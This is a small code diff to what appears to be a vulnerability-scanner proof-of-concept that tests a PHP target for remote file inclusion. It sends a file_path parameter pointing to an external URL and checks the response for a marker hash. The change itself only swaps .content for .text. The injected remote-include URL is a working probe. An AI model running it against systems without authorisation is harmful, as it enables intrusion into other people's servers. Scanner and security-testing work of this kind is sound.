@@ -48,7 +48,7 @@ class Poc(ABPoc):
                 target=self.target, vuln=self.vuln))
             arg = '{target}'.format(target=self.target)
             vul_url = arg + '/index.php?file_path=http://www.sqlsec.com/admin.html'
-            response = requests.get(vul_url).content
+            response = requests.get(vul_url).text
 
             if re.search('d4d7a6b8b3ed8ed86db2ef2cd728d8ec', response):
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
